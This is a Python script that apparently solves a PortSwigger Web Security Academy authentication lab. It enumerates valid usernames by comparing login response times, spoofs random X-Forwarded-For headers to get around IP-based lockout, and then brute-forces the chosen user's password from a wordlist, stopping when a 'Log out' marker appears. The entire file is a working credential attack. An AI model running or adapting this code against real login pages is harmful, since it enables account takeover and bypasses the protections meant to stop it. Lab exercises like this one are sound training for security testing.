import requests
import os
import datetime
from random import randint

def getWordList(file):
    password_list = []
    with open(file, "r") as pass_file:
        for line in pass_file:
            password_list.append(line.rstrip())
    return password_list

def makeRequest(url, path, post_data=None, post_headers=None):
    PROXY = {"http": "http://127.0.0.1:8080"}
    response = requests.request(
    "POST",
    f"{url}{path}",
    data=post_data,
    proxies=PROXY,
    headers=post_headers
    )
    return response

def enumerateUsers(url, path, user_list):

    MAX_RESPONSE_TIME = None
    USER = ""
    for user in user_list:
        HEADERS = {"X-Forwarded-For" : f"127.{randint(0,255)}.{randint(0,255)}.{randint(1,255)}"}
        t = datetime.datetime.now()
        res = makeRequest(url, path, post_data={"username": {user}, "password": "password1234"}, post_headers=HEADERS)
        
        time_taken = datetime.datetime.now() - t
        if MAX_RESPONSE_TIME is None:
            MAX_RESPONSE_TIME = time_taken
        if time_taken > MAX_RESPONSE_TIME:
            MAX_RESPONSE_TIME = time_taken
            USER = user
        
        for header, value in res.request.headers.items():
            print(f"{header}: {value}")    
        print(f"Trying User: {user}")
        print(f"Response Time: {time_taken}\n")

        if "too many incorrect" in res.text:
           print("Error: too many incorrect attempts")
           return 
    print(f"\n*** Max Response Time: {MAX_RESPONSE_TIME} ***")
    print(f"*** User: {USER} ***\n")
    return USER


def bruteForcePassword(url, path, password_list, victim_user):

    for password in password_list:
        HEADERS = {"X-Forwarded-For" : f"127.{randint(0,255)}.{randint(0,255)}.{randint(1,255)}"}
        t = datetime.datetime.now()
        res = makeRequest(url, path, post_data={"username": {victim_user}, "password": {password}}, post_headers=HEADERS)
        time_taken = datetime.datetime.now() - t

        for header, value in res.request.headers.items():
            print(f"{header}: {value}")
        
        print(f"Trying Password: {password}")
        print(f"Response Time: {time_taken}\n")

        if "too many incorrect" in res.text:
           return (f"Password: {password}\nError: too many incorrect attempts")
        if "Log out" in res.text:
            return f"*** FOUND PASSWORD: {password} ***"


if __name__ == '__main__':
    URL = "https://0aaf000f037138af805ac6d40083008d.web-security-academy.net/"
    PATH = "login"
    CWD = os.getcwd()
    PASS_LIST = getWordList(f'{CWD}/Authentication/passwords.txt')
    USER_LIST = getWordList(f'{CWD}/Authentication/users.txt')
    VICTIM_USER = enumerateUsers(URL, PATH, USER_LIST)
 
    password = bruteForcePassword(
        URL,
        PATH,
        PASS_LIST,
        VICTIM_USER
    )

    print(password)